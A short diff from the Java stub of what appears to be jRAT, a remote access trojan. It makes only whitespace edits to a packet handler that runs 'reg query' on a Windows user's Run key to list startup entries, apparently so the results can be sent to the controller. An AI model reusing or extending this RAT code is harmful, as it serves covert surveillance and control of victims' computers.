@@ -7,8 +7,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet53RegistryStartup;
 
-
-
 public class Packet78RegistryStartup extends AbstractIncomingPacket {
 
 	@Override
@@ -17,9 +15,9 @@ public class Packet78RegistryStartup extends AbstractIncomingPacket {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", "hkcu\\software\\microsoft\\windows\\currentversion\\run\\", "/s" });
 				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-				
+
 				String line;
-				
+
 				while ((line = reader.readLine()) != null) {
 					String[] args = line.trim().split("    ");
 
